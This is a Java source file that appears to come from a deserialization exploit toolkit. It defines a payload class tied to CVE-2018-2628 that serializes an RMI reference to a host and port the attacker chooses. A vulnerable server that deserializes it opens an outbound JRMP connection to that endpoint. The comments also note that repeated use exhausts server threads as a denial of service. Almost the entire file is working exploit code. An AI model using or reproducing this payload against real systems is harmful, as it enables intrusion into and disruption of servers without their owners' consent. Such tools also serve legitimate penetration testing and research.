package payloads;


import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import payloads.annotation.Authors;
import util.PayloadRunner;

import java.rmi.server.ObjID;
import java.util.Random;

// CVE-2018-2628
/**
 *
 *
 * UnicastRef.newCall(RemoteObject, Operation[], int, long)
 * DGCImpl_Stub.dirty(ObjID[], long, Lease)
 * DGCClient$EndpointEntry.makeDirtyCall(Set<RefEntry>, long)
 * DGCClient$EndpointEntry.registerRefs(List<LiveRef>)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Thread.start()
 * DGCClient$EndpointEntry.<init>(Endpoint)
 * DGCClient$EndpointEntry.lookup(Endpoint)
 * DGCClient.registerRefs(Endpoint, List<LiveRef>)
 * LiveRef.read(ObjectInput, boolean)
 * UnicastRef.readExternal(ObjectInput)
 *
 * Requires:
 * - JavaSE
 *
 * Argument:
 * - host:port to connect to, host only chooses random port (DOS if repeated many times)
 *
 * Yields:
 * * an established JRMP connection to the endpoint (if reachable)
 * * a connected RMI Registry proxy
 * * one system thread per endpoint (DOS)
 *
 * @author mbechler
 */
@SuppressWarnings ( {
        "restriction"
} )
@Authors({ Authors.CCKUAILONG })
public class JRMPClient3 extends PayloadRunner implements ObjectPayload<UnicastRef> {

    public UnicastRef getObject (final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return ref;
    }

    public static byte[] getBytes (final String command, Boolean fusion) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient3.class.getClassLoader());
        return PayloadRunner.run(JRMPClient3.class, command, fusion);
    }
}

